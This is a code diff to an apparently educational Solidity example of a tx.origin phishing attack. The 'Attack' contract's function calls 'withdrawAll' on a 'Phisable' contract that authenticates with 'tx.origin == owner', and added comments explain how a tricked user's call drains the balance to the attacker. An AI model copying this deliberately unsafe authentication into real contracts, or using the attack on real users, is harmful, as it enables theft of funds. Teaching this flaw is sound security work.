@@ -14,7 +14,8 @@ contract Attack {
         attacker = attackerAddr;
     }
 
-    receive() external payable {
+    // attacker has to ensure that user clicks othis function
+    function UnsafeOperation() external payable {
         phisableContract.withdrawAll(attacker);
     }
 }
@@ -26,9 +27,17 @@ contract Phisable {
         owner = _owner;
     }
 
-    function sendEther() public payable {}
+    function sendEther() public payable {
+        // user was sending eth to this contract
+        // through this function
+    }
 
     function withdrawAll(address payable _recipient) public {
+        
+        // if user call UnsafeOperation, tx.origin==user's account addr
+        // _recipient would be attacker account
+        // assume that user has interacted with this contract earlier 
+        // because of which user acc. addr == owner in this contract
         require(tx.origin == owner);
         _recipient.transfer(address(this).balance);
     }
